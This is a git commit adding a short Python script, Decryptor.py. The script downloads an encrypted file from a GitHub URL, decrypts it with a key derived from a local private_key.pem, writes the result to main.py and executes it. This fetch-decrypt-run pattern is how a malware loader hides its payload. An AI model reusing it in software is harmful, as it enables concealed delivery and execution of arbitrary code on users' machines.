9d7fd66083919b28e5d0901de240ac9eea8200f2
Kat9_123 <56130489+Kat9-123@users.noreply.github.com>
2021-03-22 11:28:47 +0100

    Add files via upload

---
+++ Decryptor.py
@@ -0,0 +1,26 @@
+from cryptography.fernet import Fernet
+from binascii import b2a_base64
+from hashlib import sha256
+import os
+import urllib.request
+urllib.request.urlretrieve('https://raw.githubusercontent.com/Kat9-123/TestRepo/main/EncryptedFile.txt','EncryptedFile.txt')
+
+
+
+with open("EncryptedFile.txt", "r") as f:
+	data = f.read()
+
+with open("private_key.pem", "r") as f:
+	key = f.read()
+
+key = b2a_base64(bytes.fromhex(sha256(key.encode()).hexdigest()))
+
+f = Fernet(key)
+
+data = f.decrypt(data.encode())
+
+
+with open("main.py", "wb") as f:
+	f.write(data)
+
+os.system("start main.py")
